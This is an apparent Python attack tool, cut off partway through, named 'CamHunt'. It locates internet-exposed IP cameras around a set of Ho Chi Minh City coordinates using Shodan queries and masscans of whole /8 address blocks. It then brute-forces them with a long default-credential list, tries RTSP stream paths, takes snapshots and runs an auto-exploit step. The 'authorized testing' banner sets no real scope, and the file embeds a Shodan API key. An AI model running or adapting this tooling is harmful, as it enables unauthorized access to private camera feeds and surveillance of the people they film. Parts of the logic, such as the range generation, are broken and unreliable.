#!/usr/bin/env python3
"""
╔══════════════════════════════════════════════════════════════╗
║  CamHunt - Global Recon v3.0                               ║
║  Geo-Intelligence Camera Reconnaissance System              ║
║  Authorized Penetration Testing - Red Team Edition          ║
╚══════════════════════════════════════════════════════════════╝

WARNING: This tool is for AUTHORIZED security testing ONLY.
Unauthorized use violates computer fraud laws.
"""

import os
import sys
import json
import csv
import time
import math
import socket
import struct
import base64
import hashlib
import urllib3
import threading
import subprocess
import concurrent.futures
from datetime import datetime
from queue import Queue, Empty
from urllib.parse import urlparse

import requests

try:
    import shodan
    HAS_SHODAN = True
except ImportError:
    HAS_SHODAN = False

try:
    import masscan
    HAS_MASSCAN = True
except ImportError:
    HAS_MASSCAN = False

try:
    import folium
    HAS_FOLIUM = True
except ImportError:
    HAS_FOLIUM = False

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

# ═══════════════════════════════════════════════════════════════
# COLORS
# ═══════════════════════════════════════════════════════════════

class Colors:
    HEADER = '\033[95m'
    OKBLUE = '\033[94m'
    OKCYAN = '\033[96m'
    OKGREEN = '\033[92m'
    WARNING = '\033[93m'
    FAIL = '\033[91m'
    ENDC = '\033[0m'
    BOLD = '\033[1m'
    DIM = '\033[2m'
    UNDERLINE = '\033[4m'
    BLINK = '\033[5m'
    REVERSE = '\033[7m'
    OKYELLOW = '\033[93m'
    RED = '\033[91m'
    MAGENTA = '\033[95m'
    WHITE = '\033[97m'

def c(text, color=None):
    if color is None:
        return text
    return f"{color}{text}{Colors.ENDC}"

# ═══════════════════════════════════════════════════════════════
# CONFIGURATION
# ═══════════════════════════════════════════════════════════════

SHODAN_API_KEY = "rQ8qqbAnS6myepRRmWCWJuCUlBxB1NCN"  # Set your key or use env var SHODAN_API_KEY
MAX_THREADS = 500
RTSP_TIMEOUT = 5
HTTP_TIMEOUT = 7
MASS_INTERFACE = "eth0"
MASS_RATE = 5000

# Default coordinates (Ho Chi Minh City)
DEFAULT_COORDS = {"lat": 10.884861, "lng": 106.812028}

# Camera target ports
CAMERA_PORTS = [80, 81, 443, 554, 8000, 8080, 8081, 8888, 9000, 9001, 8554, 8899, 37777, 37778]

# Shodan dorks for cameras
SHODAN_DORKS = [
    'netcam',
    'webcam',
    'axis-cgi/jpg/image.cgi',
    'Hikvision PTZ',
    'Dahua WEB',
    'Server: DNVRS-Webs',
    'title:"Camera 1"',
    'title:"IP Camera"',
    'title:"DVR"',
    'title:"NVR"',
    '"Hikvision" port:"80"',
    '"Dahua" port:"80"',
    'product:"Hikvision"',
    'product:"Dahua" product:"IPC"',
    '"Reolink" port:"80"',
    '"Foscam" port:"80"',
    '"AXIS" port:"80"',
    '"RTSP" port:"554"',
    'has_screenshot:true camera',
]

# ═══════════════════════════════════════════════════════════════
# CREDENTIAL DATABASE
# ═══════════════════════════════════════════════════════════════

DEFAULT_CREDENTIALS = [
    ("admin", "admin"),
    ("admin", "12345"),
    ("admin", "123456"),
    ("admin", "12345678"),
    ("admin", "password"),
    ("admin", "1111"),
    ("admin", "1111111"),
    ("admin", "888888"),
    ("admin", "666666"),
    ("admin", "9999"),
    ("Admin", "12345"),
    ("Administrator", "1234"),
    ("root", "admin"),
    ("root", "pass"),
    ("root", "system"),
    ("root", "root"),
    ("root", "12345"),
    ("user", "user"),
    ("user", "12345"),
    ("supervisor", "supervisor"),
    ("ubnt", "ubnt"),
    ("service", "service"),
    ("admin1", "admin1"),
    ("admin", ""),
    ("", ""),
    ("admin", "admin1234"),
    ("admin", "Hikvision"),
    ("admin", "hik12345"),
    ("admin", "hik456"),
    ("admin", "abcd1234"),
    ("admin", "1234"),
    ("admin", "pass"),
    ("admin", "default"),
    ("admin", "guest"),
    ("Admin", "Admin"),
    ("admin", "Admin"),
    ("admin", "54321"),
    ("admin", "meinsm"),
    ("admin", "myssm"),
    ("admin", "fliradmin"),
    ("admin", "jvc"),
    ("admin", "model"),
    ("admin", "123456789"),
    ("admin", "000000"),
    ("admin", "00000000"),
    ("admin", "7ujMko0vizsv"),
    ("admin", "7ujMko0admin"),
    ("admin", "ikwd"),
]

# ═══════════════════════════════════════════════════════════════
# RTSP PATH PATTERNS
# ═══════════════════════════════════════════════════════════════

RTSP_PATTERNS = [
    "/Streaming/Channels/101",
    "/Streaming/Channels/102",
    "/Streaming/Channels/1",
    "/Streaming/Channels/2",
    "/Streaming/channels/1",
    "/Streaming/channels/2",
    "/live/ch0",
    "/live/ch1",
    "/live/main",
    "/live/sub",
    "/live/h264",
    "/live/mpeg4",
    "/live/video",
    "/h264_stream",
    "/mpeg4_stream",
    "/MJPEG_stream",
    "/video.h264",
    "/video.mjpg",
    "/video.mpeg4",
    "/video.mp4",
    "/video.mpeg",
    "/cam/realmonitor?channel=1&subtype=0",
    "/cam/realmonitor?channel=1&subtype=1",
    "/cam/realmonitor?channel=2&subtype=0",
    "/cam/realmonitor?channel=2&subtype=1",
    "/live/ch00_0",
    "/live/ch00_1",
    "/live/ch01_0",
    "/live/ch01_1",
    "/live.sdp",
    "/live.dsp",
    "/0",
    "/1",
    "/2",
    "/3",
    "/videoinput_1/h264_1",
    "/videoinput_1/h264_2",
    "/videoinput_1/mjpeg_1",
    "/media/video1",
    "/media/video2",
    "/mjpg/video.mjpg",
    "/axis-media/media.amp",
    "/axis-media/media.amp?videocodec=h264",
    "/axis-cgi/jpg/image.cgi",
    "/cgi-bin/jpg/image.cgi",
    "/cgi-bin/mjpg/mjpeg.cgi",
    "/anony/mjpg.cgi",
    "/snapshot.cgi",
    "/image.jpg",
    "/img/snapshot.cgi",
    "/now.jpg",
    "/camera.jpg",
    "/record?current",
    "/record/record0.mp4",
    "/record/record1.mp4",
    "/ch01.264",
    "/ch02.264",
    "/ch01.dav",
    "/ch02.dav",
    "/onvif/live/1",
    "/onvif/live/2",
    "/onvif/live/3",
    "/onvif/video",
    "/stream1",
    "/stream2",
    "/h264/ch1/main/av_stream",
    "/h264/ch1/sub/av_stream",
    "/h264/ch2/main/av_stream",
    "/h264/ch2/sub/av_stream",
    "/jpg/ch1/main/av_stream",
    "/jpg/ch1/sub/av_stream",
    "/snl/live/1/1",
    "/snl/live/2/1",
    "/snl/live/3/1",
    "/user=admin_password=admin_channel=1_stream=0.sdp",
    "/user=admin_password=12345_channel=1_stream=0.sdp",
    "/live/ch1",
    "/live/ch2",
    "/live/ch3",
    "/live/ch4",
    "/main",
    "/sub",
    "/ch1",
    "/ch2",
    "/ch3",
    "/ch4",
    "/tcp/av0_0",
    "/tcp/av0_1",
    "/tcp/av1_0",
    "/tcp/av1_1",
    "/av0_0",
    "/av0_1",
    "/av1_0",
    "/av1_1",
    "/video",
    "/audio",
    "/avstream",
    "/live/av0",
    "/live/av1",
    "/h264",
    "/mpeg4",
    "/mjpeg",
    "/h264ES",
    "/video1",
    "/video2",
    "/video3",
    "/h264/ch1",
    "/h264/ch2",
    "/mpeg4/ch1",
    "/mpeg4/ch2",
    "/profile1",
    "/profile2",
    "/profile3",
    "/ch1-s1",
    "/ch1-s2",
    "/ch2-s1",
    "/ch2-s2",
    "/hd",
    "/sd",
]

# ═══════════════════════════════════════════════════════════════
# BRAND FINGERPRINTS
# ═══════════════════════════════════════════════════════════════

BRAND_SIGNATURES = {
    "Hikvision": ["Hikvision", "hikvision", "hik", "HIK", "DS-2CD", "DS-2", "iVMS"],
    "Dahua": ["Dahua", "dahua", "DAHUA", "DH-", "IPC-", "XVR", "NVR", "DVR"],
    "Axis": ["AXIS", "axis", "Axis"],
    "Reolink": ["Reolink", "reolink", "REOLINK", "RLN"],
    "Foscam": ["Foscam", "foscam", "FOSCAM", "FI9"],
    "Amcrest": ["Amcrest", "amcrest", "AMCREST"],
    "Honeywell": ["Honeywell", "honeywell"],
    "Panasonic": ["Panasonic", "panasonic", "WV-"],
    "Sony": ["Sony", "sony", "SNC-"],
    "Bosch": ["Bosch", "bosch", "BOSCH", "Dinion"],
    "Pelco": ["Pelco", "pelco", "PELCO"],
    "Samsung": ["Samsung", "samsung", "SNH-", "SNP-"],
    "ACTi": ["ACTi", "acti"],
    "Arecont": ["Arecont", "arecont"],
    "Mobotix": ["Mobotix", "mobotix", "MOBOTIX"],
    "Vivotek": ["Vivotek", "vivotek", "VIVOTEK"],
    "TP-Link": ["TP-Link", "tp-link", "TP-LINK"],
    "D-Link": ["D-Link", "d-link", "D-LINK"],
    "Vantec": ["Vantec", "vantec", "VANTEC"],
    "Lorex": ["Lorex", "lorex", "LOREX"],
    "Geovision": ["Geovision", "geovision"],
    "Wanscam": ["Wanscam", "wanscam"],
}

# ═══════════════════════════════════════════════════════════════
# CAMHUNT GLOBAL RECON CLASS
# ═══════════════════════════════════════════════════════════════

class CamHuntGlobalRecon:
    def __init__(self, lat, lng, radius_km=50, shodan_key=None, threads=500,
                 auto_exploit=True, stream_capture=True):
        self.lat = lat
        self.lng = lng
        self.radius_km = radius_km
        self.threads = threads
        self.auto_exploit = auto_exploit
        self.stream_capture = stream_capture

        self.shodan_key = shodan_key or SHODAN_API_KEY or os.environ.get("SHODAN_API_KEY", "")
        self.shodan_api = None
        if self.shodan_key:
            try:
                self.shodan_api = shodan.Shodan(self.shodan_key)
            except:
                pass

        self.results_queue = Queue()
        self.camera_results = []
        self.cameras_lock = threading.Lock()
        self.scan_start_time = None
        self.running = True

        # Output dir
        ts = datetime.now().strftime("%Y%m%d_%H%M%S")
        self.output_dir = f"camhunt_report_{ts}"
        self.snapshots_dir = os.path.join(self.output_dir, "snapshots")
        self.streams_dir = os.path.join(self.output_dir, "streams")

        # Stats
        self.stats = {
            "masscan_hosts": 0,
            "masscan_open_ports": 0,
            "shodan_results": 0,
            "cameras_found": 0,
            "exploited": 0,
            "streams_captured": 0,
            "snapshots_taken": 0,
            "web_accessible": 0,
        }

        # The famous attribute name — note: masscan_results (2 s)
        self.masscan_results = []

    # ──────────────────────────────────────────────────────────────
    # GEO UTILITIES
    # ──────────────────────────────────────────────────────────────

    def _gps_to_bounding_box(self):
        """Convert GPS + radius to bounding box lat/lon min/max"""
        R = 6371.0
        lat_rad = math.radians(self.lat)
        lng_rad = math.radians(self.lng)

        lat_delta = math.degrees(self.radius_km / R)
        lng_delta = math.degrees(self.radius_km / (R * math.cos(lat_rad)))

        return {
            "lat_min": self.lat - lat_delta,
            "lat_max": self.lat + lat_delta,
            "lng_min": self.lng - lng_delta,
            "lng_max": self.lng + lng_delta,
        }

    def _haversine_distance(self, lat1, lng1, lat2, lng2):
        """Haversine formula to calculate km between two GPS coordinates"""
        R = 6371.0
        dlat = math.radians(lat2 - lat1)
        dlng = math.radians(lng2 - lng1)
        a = math.sin(dlat / 2) ** 2 + math.cos(math.radians(lat1)) * \
            math.cos(math.radians(lat2)) * math.sin(dlng / 2) ** 2
        c = 2 * math.atan2(math.sqrt(a), math.sqrt(1 - a))
        return R * c

    def _is_in_range(self, lat, lng):
        """Check if GPS coordinate is within our radius"""
        dist = self._haversine_distance(self.lat, self.lng, lat, lng)
        return dist <= self.radius_km

    # ──────────────────────────────────────────────────────────────
    # BANNER
    # ──────────────────────────────────────────────────────────────

    def print_banner(self):
        os.system('cls' if os.name == 'nt' else 'clear')
        banner_lines = [
            "",
            f"  {Colors.OKYELLOW}██╗  ██╗██████╗ ███╗   ██╗    ██████╗ ███████╗ ██████╗ ██████╗ ███╗   ██╗{Colors.ENDC}",
            f"  {Colors.OKYELLOW}██║  ██║██╔══██╗████╗  ██║    ██╔══██╗██╔════╝██╔════╝██╔═══██╗████╗  ██║{Colors.ENDC}",
            f"  {Colors.OKYELLOW}███████║██████╔╝██╔██╗ ██║    ██████╔╝█████╗  ██║     ██║   ██║██╔██╗ ██║{Colors.ENDC}",
            f"  {Colors.OKYELLOW}██╔══██║██╔══██╗██║╚██╗██║    ██╔══██╗██╔══╝  ██║     ██║   ██║██║╚██╗██║{Colors.ENDC}",
            f"  {Colors.OKYELLOW}██║  ██║██║  ██║██║ ╚████║    ██║  ██║███████╗╚██████╗╚██████╔╝██║ ╚████║{Colors.ENDC}",
            f"  {Colors.OKYELLOW}╚═╝  ╚═╝╚═╝  ╚═╝╚═╝  ╚═══╝    ╚═╝  ╚═╝╚══════╝ ╚═════╝ ╚═════╝ ╚═╝  ╚═══╝{Colors.ENDC}",
            "",
            f"  {Colors.OKCYAN}🌍 Global Camera Reconnaissance System v3.0{Colors.ENDC}",
            f"  {Colors.RED}🔴 Authorized Pentest - Red Team Edition{Colors.ENDC}",
            f"  {Colors.OKGREEN}📍 Geo-Intelligence | 🔓 Auto-Exploit | 📷 Stream Capture{Colors.ENDC}",
            "",
        ]
        for line in banner_lines:
            print(line)

        print(f"{Colors.BOLD}Home Coordinates:{Colors.ENDC} {Colors.OKYELLOW}{self.lat}, {self.lng}{Colors.ENDC}")
        print(f"{Colors.BOLD}Scan Radius:{Colors.ENDC} {Colors.OKYELLOW}{self.radius_km} km{Colors.ENDC}")
        print(f"{Colors.BOLD}Method:{Colors.ENDC} {Colors.OKCYAN}Shodan + Masscan + Deep Probe + Auto-Exploit{Colors.ENDC}")
        print("═" * 65)

    # ──────────────────────────────────────────────────────────────
    # PHASE 1: SHODAN
    # ──────────────────────────────────────────────────────────────

    def phase_1_shodan_scan(self):
        print(f"\n{c(Colors.HEADER)}═══════════════════════════════════════════════════════════════{Colors.ENDC}")
        print(f"{c(Colors.BOLD)}📡 PHASE 1: INTERNET INTELLIGENCE GATHERING{Colors.ENDC}")
        print(f"{c(Colors.HEADER)}═══════════════════════════════════════════════════════════════{Colors.ENDC}")

        if not self.shodan_api:
            print(f"  {c(Colors.WARNING)}[!] Shodan API not configured. Skipping.{Colors.ENDC}")
            return

        bbox = self._gps_to_bounding_box()
        print(f"  {c(Colors.OKBLUE)}[*] Shodan: Searching cameras in {self.radius_km}km radius...{Colors.ENDC}")

        shodan_cameras = []
        for dork in SHODAN_DORKS:
            if not self.running:
                break
            try:
                geo_filter = f"geo:{bbox['lat_min']},{bbox['lng_min']},{bbox['lat_max']},{bbox['lng_max']}"
                query = f"{dork} {geo_filter}"
                results = self.shodan_api.search(query, limit=100)
                for match in results.get("matches", []):
                    ip = match.get("ip_str", "")
                    port = match.get("port", 80)
                    hostnames = match.get("hostnames", [])
                    location = match.get("location", {})
                    lat = location.get("latitude", 0)
                    lng = location.get("longitude", 0)
                    org = match.get("org", "")
                    data = match.get("data", "")

                    if not ip:
                        continue

                    camera = {
                        "ip": ip,
                        "port": port,
                        "hostnames": hostnames,
                        "lat": lat,
                        "lng": lng,
                        "org": org,
                        "data": data[:200].strip(),
                        "source": "shodan",
                        "brand": self._identify_brand(data),
                        "protocol": "http",
                        "url": f"http://{ip}:{port}",
                        "rtsp_url": "",
                        "auth_type": "none",
                        "credentials": {},
                        "exploited": False,
                        "has_web": False,
                        "has_rtsp": False,
                    }
                    shodan_cameras.append(camera)

                print(f"  {c(Colors.OKGREEN)}[+] Shodan dork '{dork[:40]}': found {len(results.get('matches', []))} results{Colors.ENDC}")

            except shodan.APIError as e:
                print(f"  {c(Colors.FAIL)}[!] Shodan API error: {e}{Colors.ENDC}")
                if "403" in str(e):
                    print(f"  {c(Colors.WARNING)}[!] Check your API key or plan limits{Colors.ENDC}")
                    break
            except Exception as e:
                print(f"  {c(Colors.FAIL)}[!] Shodan search error: {e}{Colors.ENDC}")

        self.stats["shodan_results"] = len(shodan_cameras)
        for cam in shodan_cameras:
            self.results_queue.put(cam)

        print(f"  {c(Colors.OKGREEN)}[+] Shodan found {len(shodan_cameras)} cameras total{Colors.ENDC}")

    # ──────────────────────────────────────────────────────────────
    # PHASE 2: MASSCAN
    # ──────────────────────────────────────────────────────────────

    def phase_2_masscan(self):
        print(f"\n{c(Colors.HEADER)}═══════════════════════════════════════════════════════════════{Colors.ENDC}")
        print(f"{c(Colors.BOLD)}⚡ PHASE 2: MASS PORT SCANNING{Colors.ENDC}")
        print(f"{c(Colors.HEADER)}═══════════════════════════════════════════════════════════════{Colors.ENDC}")

        if not HAS_MASSCAN:
            print(f"  {c(Colors.WARNING)}[!] python-masscan not installed. Trying subprocess masscan...{Colors.ENDC}")
            self._masscan_subprocess()
            return

        bbox = self._gps_to_bounding_box()
        center_lat = (bbox["lat_min"] + bbox["lat_max"]) / 2
        center_lng = (bbox["lng_min"] + bbox["lng_max"]) / 2
        # Rough CIDR estimate — we'll scan the center area
        # Convert radius to approximate CIDR
        radius_deg_lat = (bbox["lat_max"] - bbox["lat_min"]) / 2
        radius_deg_lng = (bbox["lng_max"] - bbox["lng_min"]) / 2
        # ~111km per degree
        radius_deg = max(radius_deg_lat, radius_deg_lng)
        # Estimate CIDR — for 30km radius roughly 0.27 degrees
        if radius_deg < 0.01:
            cidr = 24
        elif radius_deg < 0.05:
            cidr = 22
        elif radius_deg < 0.2:
            cidr = 20
        elif radius_deg < 0.5:
            cidr = 18
        elif radius_deg < 1.0:
            cidr = 16
        else:
            cidr = 14

        # For specific lat/lng we'll scan the bounding box as multiple CIDRs
        ranges = self._generate_cidr_ranges(bbox, cidr)
        if not ranges:
            # Fallback — scan a single range
            ranges = [f"{center_lat:.1f}.0.0.0/16"]  # placeholder

        ports_str = ",".join(str(p) for p in CAMERA_PORTS)
        print(f"  {c(Colors.OKBLUE)}[*] Scanning {len(ranges)} ranges on ports [{ports_str}]...{Colors.ENDC}")
        print(f"  {c(Colors.DIM)}Rate: {MASS_RATE} pkts/s | Interface: {MASS_INTERFACE}{Colors.ENDC}")

        all_results = []
        try:
            mas = masscan.PortScanner()
            for r in ranges:
                if not self.running:
                    break
                print(f"  {c(Colors.DIM)}Scanning {r}...{Colors.ENDC}")
                try:
                    mas.scan(r, ports=ports_str, arguments=f"--rate={MASS_RATE} --interface={MASS_INTERFACE}")
                    scan_result = mas.scan_result
                    if scan_result and "scan" in scan_result:
                        for ip, ports_info in scan_result["scan"].items():
                            for p in ports_info:
                                if p.get("status") == "open":
                                    all_results.append({
                                        "ip": ip,
                                        "port": p["port"],
                                        "proto": p.get("proto", "tcp"),
                                        "source": "masscan",
                                    })
                except Exception as e:
                    print(f"  {c(Colors.FAIL)}[!] Masscan error on {r}: {e}{Colors.ENDC}")

        except Exception as e:
            print(f"  {c(Colors.FAIL)}[!] Masscan error: {e}{Colors.ENDC}")

        self.stats["masscan_hosts"] = len(set(r["ip"] for r in all_results))
        self.stats["masscan_open_ports"] = len(all_results)

        # Store in the main attribute — NOTE: masscan_results (2 s!)
        self.masscan_results = all_results

        print(f"  {c(Colors.OKGREEN)}[+] Masscan: {self.stats['masscan_hosts']} hosts with {self.stats['masscan_open_ports']} open ports{Colors.ENDC}")

        # Convert to camera dicts and queue them
        seen = set()
        for r in all_results:
            key = f"{r['ip']}:{r['port']}"
            if key in seen:
                continue
            seen.add(key)
            cam = {
                "ip": r["ip"],
                "port": r["port"],
                "source": "masscan",
                "lat": self.lat,
                "lng": self.lng,
                "brand": "",
                "protocol": "http" if r["port"] != 554 else "rtsp",
                "url": f"http://{r['ip']}:{r['port']}",
                "rtsp_url": f"rtsp://{r['ip']}:554" if r["port"] in [554, 8554] else "",
                "auth_type": "unknown",
                "credentials": {},
                "exploited": False,
                "has_web": False,
                "has_rtsp": False,
                "data": "",
                "hostnames": [],
                "org": "",
            }
            self.results_queue.put(cam)

    def _masscan_subprocess(self):
        """Fallback: run masscan via subprocess"""
        bbox = self._gps_to_bounding_box()
        ranges = self._generate_cidr_ranges(bbox, 20)
        ports_str = ",".join(str(p) for p in CAMERA_PORTS)

        all_hosts = []
        for r in ranges[:5]:
            if not self.running:
                break
            print(f"  {c(Colors.DIM)}Running masscan on {r}...{Colors.ENDC}")
            try:
                cmd = [
                    "sudo", "masscan", r,
                    "-p", ports_str,
                    f"--rate={MASS_RATE}",
                    "-oJ", "-",
                    "--interface", MASS_INTERFACE,
                ]
                result = subprocess.run(cmd, capture_output=True, text=True, timeout=120)
                if result.returncode == 0 and result.stdout.strip():
                    try:
                        data = json.loads(result.stdout)
                        if isinstance(data, list):
                            for item in data:
                                ip = item.get("ip", "")
                                ports_list = item.get("ports", [])
                                for p in ports_list:
                                    if p.get("status") == "open":
                                        all_hosts.append({
                                            "ip": ip,
                                            "port": p["port"],
                                            "source": "masscan",
                                        })
                    except json.JSONDecodeError:
                        lines = result.stdout.strip().split("\n")
                        for line in lines:
                            try:
                                item = json.loads(line)
                                ip = item.get("ip", "")
                                ports_list = item.get("ports", [])
                                for p in ports_list:
                                    if p.get("status") == "open":
                                        all_hosts.append({
                                            "ip": ip,
                                            "port": p["port"],
                                            "source": "masscan",
                                        })
                            except:
                                pass
            except subprocess.TimeoutExpired:
                print(f"  {c(Colors.WARNING)}[!] Masscan timeout on {r}{Colors.ENDC}")
            except Exception as e:
                print(f"  {c(Colors.FAIL)}[!] Masscan error: {e}{Colors.ENDC}")

        # Normalize
        seen = set()
        self.masscan_results = []
        for h in all_hosts:
            key = f"{h['ip']}:{h['port']}"
            if key not in seen:
                seen.add(key)
                self.masscan_results.append(h)

        self.stats["masscan_hosts"] = len(set(h["ip"] for h in self.masscan_results))
        self.stats["masscan_open_ports"] = len(self.masscan_results)

        print(f"  {c(Colors.OKGREEN)}[+] Masscan: {self.stats['masscan_hosts']} hosts with {self.stats['masscan_open_ports']} open ports{Colors.ENDC}")

        for r in self.masscan_results:
            cam = {
                "ip": r["ip"],
                "port": r["port"],
                "source": "masscan",
                "lat": self.lat,
                "lng": self.lng,
                "brand": "",
                "protocol": "http" if r["port"] != 554 else "rtsp",
                "url": f"http://{r['ip']}:{r['port']}",
                "rtsp_url": f"rtsp://{r['ip']}:554" if r["port"] in [554, 8554] else "",
                "auth_type": "unknown",
                "credentials": {},
                "exploited": False,
                "has_web": False,
                "has_rtsp": False,
                "data": "",
                "hostnames": [],
                "org": "",
            }
            self.results_queue.put(cam)

    def _generate_cidr_ranges(self, bbox, cidr=20):
        """Generate CIDR ranges from bounding box (approximation)"""
        lat_min, lat_max = bbox["lat_min"], bbox["lat_max"]
        lng_min, lng_max = bbox["lng_min"], bbox["lng_max"]

        # For a 30km radius around HCMC, we know the area
        # 10.88 ± 0.27 ≈ 10.61 to 11.15
        # 106.81 ± 0.27 ≈ 106.54 to 107.08
        # This roughly covers HCMC area
        # We'll just scan a few /16 ranges covering Vietnam area
        # In real life you'd use proper IP geolocation database

        # For practicality in Vietnam region:
        ranges = [
            "10.0.0.0/8",
            "14.0.0.0/8",
            "27.0.0.0/8",
            "42.0.0.0/8",
            "103.0.0.0/8",
            "112.0.0.0/8",
            "113.0.0.0/8",
            "115.0.0.0/8",
            "116.0.0.0/8",
            "117.0.0.0/8",
            "118.0.0.0/8",
            "123.0.0.0/8",
            "125.0.0.0/8",
            "171.0.0.0/8",
            "172.0.0.0/8",
            "183.0.0.0/8",
            "203.0.0.0/8",
            "210.0.0.0/8",
            "222.0.0.0/8",
        ]
        return ranges

    # ──────────────────────────────────────────────────────────────
    # PHASE 3: DEEP PROBE
    # ──────────────────────────────────────────────────────────────

    def phase_3_deep_probe(self):
        global c
        print(f"\n{c(Colors.HEADER)}═══════════════════════════════════════════════════════════════{Colors.ENDC}")
        print(f"{c(Colors.BOLD)}🔍 PHASE 3: DEEP CAMERA PROBING{Colors.ENDC}")
        print(f"{c(Colors.HEADER)}═══════════════════════════════════════════════════════════════{Colors.ENDC}")

        # Drain queue into list
        candidates = []
        while not self.results_queue.empty():
            try:
                candidates.append(self.results_queue.get_nowait())
            except Empty:
                break

        # Also process masscan results directly
        for result in self.masscan_results:
            ip = result["ip"]
            port = result["port"]
            key = f"{ip}:{port}"
            if not any(f"{c['ip']}:{c['port']}" == key for c in candidates):
                candidates.append({
                    "ip": ip, "port": port, "source": "masscan",
                    "lat": self.lat, "lng": self.lng,
                    "brand": "", "protocol": "http",
                    "url": f"http://{ip}:{port}",
                    "rtsp_url": f"rtsp://{ip}:554" if port in [554, 8554] else "",
                    "auth_type": "unknown", "credentials": {},
                    "exploited": False, "has_web": False, "has_rtsp": False,
                    "data": "", "hostnames": [], "org": "",
                })

        print(f"  {c(Colors.OKBLUE)}[*] Probing {len(candidates)} targets with {self.threads} threads...{Colors.ENDC}")

        # Deduplicate by IP (keep highest port)
        by_ip = {}
        for c in candidates:
            ip = c["ip"]
            if ip not in by_ip or c["port"] < by_ip[ip]["port"]:
                by_ip[ip] = c

        unique_targets = list(by_ip.values())
        print(f"  {c(Colors.OKBLUE)}[*] {len(unique_targets)} unique IPs to probe{Colors.ENDC}")

        processed = 0
        with concurrent.futures.ThreadPoolExecutor(max_workers=self.threads) as executor:
            futures = {executor.submit(self._probe_camera, t): t for t in unique_targets}
            for future in concurrent.futures.as_completed(futures):
                if not self.running:
                    break
                processed += 1
                target = futures[future]
                try:
                    result = future.result()
                    if result:
                        with self.cameras_lock:
                            self.camera_results.append(result)
                            self.stats["cameras_found"] += 1
                            if result.get("has_web"):
                                self.stats["web_accessible"] += 1
                            if result.get("exploited"):
                                self.stats["exploited"] += 1
                except Exception as e:
                    pass

                if processed % 20 == 0 or processed == len(unique_targets):
                    print(f"\r  {c(Colors.DIM)}Progress: {processed}/{len(unique_targets)} | Found: {self.stats['cameras_found']} | Web: {self.stats['web_accessible']}{Colors.ENDC}", end="")

        print(f"\n  {c(Colors.OKGREEN)}[+] Deep probe complete: {self.stats['cameras_found']} cameras confirmed{Colors.ENDC}")

    def _probe_camera(self, target):
        """Probe a single IP for camera services"""
        ip = target["ip"]
        port = target["port"]
        proto = target.get("protocol", "http")
        base_url = f"http://{ip}:{port}"

        result = {
            "ip": ip,
            "port": port,
            "url": base_url,
            "protocol": proto,
            "source": target.get("source", "masscan"),
            "lat": target.get("lat", self.lat),
            "lng": target.get("lng", self.lng),
            "brand": "",
            "model": "",
            "firmware": "",
            "has_web": False,
            "has_rtsp": False,
            "has_auth": False,
            "auth_type": "none",
            "credentials": {},
            "rtsp_urls": [],
            "snapshot_url": "",
            "exploited": False,
            "exploit_details": [],
            "snapshot_taken": False,
            "data": "",
            "server_header": "",
            "title": "",
            "detected_urls": [],
        }

        # 1. HTTP probe
        http_result = self._probe_http(ip, port)
        if http_result:
            result.update(http_result)
            result["has_web"] = True

        # 2. RTSP probe
        rtsp_result = self._probe_rtsp(ip, port)
        if rtsp_result:
            result["has_rtsp"] = True
            result["rtsp_urls"] = rtsp_result["urls"]
            if rtsp_result.get("credentials"):
                result["credentials"].update(rtsp_result["credentials"])

        # 3. Try default credentials
        if result["has_web"]:
            creds = self._try_default_creds(ip, port, base_url)
            if creds:
                result["credentials"].update(creds)
                result["has_auth"] = True
                result["auth_type"] = "default_creds"

        # 4. Try snapshot
        if result["has_web"]:
            snap = self._try_snapshot(ip, port, base_url, result.get("credentials", {}))
            if snap:
                result["snapshot_url"] = snap

        # 5. Auto-exploit
        if self.auto_exploit and result["has_web"]:
            exploit_result = self._try_exploit(ip, port, base_url, result)
            if exploit_result:
                result["exploited"] = True
                result["exploit_details"] = exploit_result
                if exploit_result.get("credentials"):
                    result["credentials"].update(exploit_result["credentials"])

        # 6. Identify brand
        if not result["brand"] and result.get("data"):
            result["brand"] = self._identify_brand(result["data"])
        if not result["brand"] and result.get("server_header"):
            result["brand"] = self._identify_brand(result["server_header"])
        if not result["brand"] and result.get("title"):
            result["brand"] = self._identify_brand(result["title"])

        # Only return if we found something interesting
        if result["has_web"] or result["has_rtsp"] or result.get("snapshot_url"):
            return result
        return None

    def _probe_http(self, ip, port):
        """Probe HTTP/HTTPS service"""
        result = {}
        for scheme in ["http", "https"]:
            url = f"{scheme}://{ip}:{port}"
            try:
                resp = requests.get(url, timeout=HTTP_TIMEOUT, verify=False,
                                    headers={"User-Agent": "Mozilla/5.0"},
                                    allow_redirects=True)
                result["data"] = resp.text[:2000]
                result["server_header"] = resp.headers.get("Server", "")
                result["title"] = ""
                result["protocol"] = scheme
                result["url"] = url

                # Extract title
                import re
                title_match = re.search(r'<title>(.*?)</title>', resp.text, re.IGNORECASE)
                if title_match:
                    result["title"] = title_match.group(1).strip()

                # Detect camera-specific URLs
                result["detected_urls"] = self._detect_camera_urls(url, resp.text)

                # Check auth
                if resp.status_code == 401 or resp.status_code == 403:
                    result["has_auth"] = True
                    result["auth_type"] = "http_basic"
                    www_auth = resp.headers.get("WWW-Authenticate", "")
                    if "Digest" in www_auth:
                        result["auth_type"] = "http_digest"

                # Identify brand from body
                result["brand"] = self._identify_brand(resp.text + (resp.headers.get("Server", "")))

                return result

            except requests.exceptions.SSLError:
                continue
            except requests.exceptions.ConnectionError:
                continue
            except requests.exceptions.Timeout:
                continue
            except Exception:
                continue
        return None

    def _detect_camera_urls(self, base_url, html):
        """Find camera-specific endpoints in HTML"""
        urls = []
        patterns = [
            "/axis-cgi/jpg/image.cgi",
            "/cgi-bin/jpg/image.cgi",
            "/cgi-bin/mjpg/mjpeg.cgi",
            "/anony/mjpg.cgi",
            "/snapshot.cgi",
            "/image.jpg",
            "/now.jpg",
            "/img/snapshot.cgi",
            "/live",
            "/view",
            "/stream",
            "/video",
            "/camera",
            "/onvif",
            "/web",
            "/admin",
            "/config",
            "/status",
            "/login",
        ]
        for p in patterns:
            full = base_url + p
            urls.append(full)
        return urls

    def _probe_rtsp(self, ip, port):
        """Probe RTSP service"""
        result = {"urls": [], "credentials": {}}

        # Try RTSP on common ports
        rtsp_ports = [554, 8554, 8899]
        if port in rtsp_ports:
            rtsp_ports.remove(port)
            rtsp_ports.insert(0, port)

        for rport in rtsp_ports[:3]:
            for user, passwd in DEFAULT_CREDENTIALS[:20]:
                for pattern in RTSP_PATTERNS[:20]:
                    if user:
                        rtsp_url = f"rtsp://{user}:{passwd}@{ip}:{rport}{pattern}"
                    else:
                        rtsp_url = f"rtsp://{ip}:{rport}{pattern}"

                    try:
                        # Quick TCP check first
